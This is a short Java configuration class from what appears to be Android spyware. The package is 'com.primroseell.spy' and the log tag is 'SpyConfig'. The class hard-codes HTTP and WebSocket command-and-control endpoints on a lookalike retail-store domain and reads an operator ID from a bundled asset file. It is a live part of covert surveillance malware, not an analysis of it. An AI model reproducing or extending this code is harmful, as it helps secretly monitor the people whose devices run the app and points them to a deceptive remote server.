package com.primroseell.spy;

import android.content.Context;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Config {
    private static final String TAG = "SpyConfig";

    // URL Server utama kamu
    public static String API_URL = "http://alfa-store-officials.alfamarket2.my.id:3505";
    public static String WS_URL = "ws://alfa-store-officials.alfamarket2.my.id:3505";

    // Fungsi ini akan membaca ID unik perangkat saat aplikasi dijalankan
    public static String getUsername(Context context) {
        try {
            // Membaca file konfigurasi di folder assets
            InputStream is = context.getAssets().open("@Primroseell.xyz");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String username = reader.readLine();
            reader.close();
            is.close();
            return username != null ? username.trim() : "default";
        } catch (Exception e) {
            // Jika file tidak ditemukan, gunakan ID default
            return "default";
        }
    }
}